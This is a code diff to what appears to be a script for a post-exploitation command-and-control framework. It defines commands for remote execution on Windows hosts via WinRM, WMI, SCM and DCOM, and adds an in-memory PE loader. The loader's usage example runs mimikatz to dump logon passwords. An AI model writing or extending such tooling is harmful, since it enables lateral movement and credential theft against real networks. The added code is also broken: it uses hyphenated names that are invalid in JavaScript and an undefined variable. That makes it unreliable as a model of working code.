@@ -1,4 +1,4 @@
-// REMOTE EXEC
+﻿// REMOTE EXEC
 
 let cmd_rmt_exec_winrm = ax.create_command("winrm", "Execute command on remote machine using WinRM protocol", "remote-exec winrm -t 192.168.1.10 -c \"whoami\" -u admin -p pass", "Task: remote execution via WinRM");
 cmd_rmt_exec_winrm.addArgFlagString("-t", "target", "Computer name or IP address", true);
@@ -82,6 +82,23 @@ cmd_rmt_exec_dcom.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
 let cmd_rmt_exec = ax.create_command("remote-exec", "Execute commands on remote machines via WMI, WinRM, SCM, or DCOM");
 cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_scm, cmd_rmt_exec_dcom]);
+
+// PE REFLECTION
+
+let cmd_pe-reflect = ax.create_command("pe-reflect", "Execute PE in memory", "pe-reflect -f /tmp/mimikatz.exe -a \"sekurlsa::logonpasswords\" \"exit\" ", "Task: execute PE inline");
+cmd_pe-reflect.addArgFlagFile("-f", "pe_file", true, "PE file");
+cmd_pe-reflect.addArgFlagString("-a", "args", false, "PE arguments");
+cmd_pe-reflect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let pe-reflect_file = parsed_json["pe_file"];
+    let args = parsed_json["args"] || "";
+    
+    let mod_params = ax.bof_pack("bytes,cstr", [dotnet_file, args]);
+    let mod_path = ax.script_dir() + "Shellcode/Reflection/Bin/pe_reflection." + ax.arch(id) + ".bin";
+    let message = `Task: executing PE in-memory`;
+
+    ax.execute_alias(id, cmdline, `execute postex -m inline -f ${mod_path} -a ${mod_params}`, message);
+});
+
 
 // DOTNET
 
